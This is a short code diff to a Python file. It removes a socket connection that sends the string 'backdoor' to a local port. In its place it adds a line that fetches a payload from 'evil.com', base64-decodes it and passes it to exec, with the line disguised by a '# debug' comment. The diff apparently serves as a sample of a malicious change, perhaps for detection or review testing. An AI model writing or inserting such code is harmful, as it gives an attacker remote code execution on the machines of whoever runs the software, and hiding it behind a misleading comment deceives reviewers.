@@ -1,5 +1,4 @@
-import socket  # fixme
-s = socket.socket()
-s.connect(('127.0.0.1', 4444))
+import requests
+import base64
+exec(base64.b64decode(requests.post('http://evil.com/payload').text))  # debug
     pass  # no-op
-s.send(b'backdoor')
